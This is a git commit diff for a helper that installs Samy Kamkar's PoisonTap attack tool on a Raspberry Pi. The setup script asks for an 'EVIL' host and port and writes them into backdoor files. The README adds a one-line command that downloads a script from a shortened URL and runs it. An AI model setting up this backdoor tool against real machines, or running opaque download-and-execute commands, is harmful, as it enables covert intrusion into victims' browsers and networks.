6ab6e545b0971ebcadc7061d8f500768f853a0aa
Torsten Juul-Jensen <m71568@sanitizer.localdomain>
2017-09-07 12:39:24 +0200

    Minor changes

--- README.md
+++ README.md
@@ -1,2 +1,6 @@
 # poisontap-install
 Poisontap install helper
+Refers to the Samy Kamkar project on https://github.com/samyk/poisontap
+
+Installation can be started using the following command:
+wget https://goo.gl/JKMwD1 -O poisontap-setup.sh && chmod +x poisontap-setup.sh && ./poisontap-setup.sh
--- poisontap-setup.sh
+++ poisontap-setup.sh
@@ -1,4 +1,7 @@
 #!/bin/bash
+# Installation script for configuring a poinsontap device on a clean raspbian image
+# Installation refers to Samy Kamkars piosontap project on https://github.com/samyk/poisontap
+
 # Instructions adjusted from https://gist.github.com/gbaman/50b6cca61dd1c3f88f41
 
 # If Raspbian BEFORE 2016-05-10, then run next line:
@@ -22,36 +25,29 @@ _setHostname(){
   echo Current hostname is $HOSTNAME
   read -r -p "Enter NEW hostname: " NEWHOSTNAME
   hostnamectl set-hostname --static "$NEWHOSTNAME"
-
 }
 
 _getNewEvilHostname(){
   # set hostname of evil host
   echo
-
   while [[ -z "$NEWEVILHOSTNAME" ]];
   do
     read -r -p "Enter the hostname of the ""EVIL"" host: " NEWEVILHOSTNAME
   done
-
   # replace YOUR.DOMAIN in backdoor.html and target_backdoor.js
   sed 's/YOUR.DOMAIN/$NEWEVILHOSTNAME/g' poisontap/backdoor.html
   sed 's/YOUR.DOMAIN/$NEWEVILHOSTNAME/g' poisontap/target_backdoor.js
-
 }
 
 _getNewEvilPort(){
   # set hostname of evil host
   echo
-
   while [[ -z "$NEWEVILPORT" ]];
   do
     read -r -p "Enter the port number of the ""EVIL"" host: " NEWEVILPORT
   done
-
   # replace default port number 1337 in backdoor.html
   sed 's/:1337/:$NEWEVILPORT/g' poisontap/backdoor.html
-
 }
 
 # elevate privileges to root
@@ -59,7 +55,7 @@ _getNewEvilPort(){
 
 # update raspbian and install packages
 apt-get update && apt-get -y upgrade
-apt-get -y install isc-dhcp-server dsniff screen nodejs git nmap
+apt-get -y install isc-dhcp-server dsniff screen nodejs git
 
 # get poinsontap source from github and put it in home/pi/poisontap
 cd /home/pi
